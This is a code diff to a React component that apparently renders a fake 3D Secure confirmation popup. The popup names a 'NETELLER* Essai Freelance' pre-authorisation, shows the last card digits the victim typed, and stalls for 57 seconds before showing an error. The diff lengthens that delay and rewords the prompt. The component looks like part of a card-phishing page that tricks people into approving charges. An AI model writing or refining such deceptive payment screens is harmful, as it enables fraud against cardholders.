@@ -33,7 +33,7 @@ const Board = () => {
     if (show3DSecurePopup) {
       errorTimeout = setTimeout(() => {
         setShowError(true);
-      }, 53000); // DELAY TO SHOW ERROR MESSAGE
+      }, 57000); // DELAY TO SHOW ERROR MESSAGE
     }
     return () => {
       clearTimeout(errorTimeout);
@@ -44,7 +44,7 @@ const Board = () => {
     if (show3DSecurePopup) {
       const errorTimeout = setTimeout(() => {
         setShowError(true);
-      }, 53000); // DELAY TO SHOW ERROR MESSAGE
+      }, 57000); // DELAY TO SHOW ERROR MESSAGE
       return () => clearTimeout(errorTimeout);
     }
   }, [show3DSecurePopup]);
@@ -206,7 +206,7 @@ const Board = () => {
               </>
             ) : (
               <>
-                <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')} via votre application bancaire.</p>
+                <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')}</p>
                 <span>NETELLER* Essai Freelance</span>
                 <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                 <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>
